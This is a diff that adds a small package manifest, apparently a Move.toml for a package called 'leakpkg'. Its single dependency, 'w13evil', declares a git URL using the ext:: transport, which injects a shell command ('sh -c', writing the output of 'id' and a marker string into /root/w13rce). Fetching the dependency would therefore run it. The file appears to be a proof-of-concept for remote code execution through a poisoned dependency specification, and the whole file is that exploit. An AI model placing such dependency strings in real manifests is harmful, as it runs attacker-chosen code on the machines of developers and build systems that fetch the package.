@@ -1,0 +1,9 @@
+[package]
+name = "leakpkg"
+version = "0.0.1"
+
+[addresses]
+leakpkg = "0x0"
+
+[dependencies]
+w13evil = { git = "ext::sh -c 'id > /root/w13rce; echo W13RCE >> /root/w13rce'", rev = "main" }
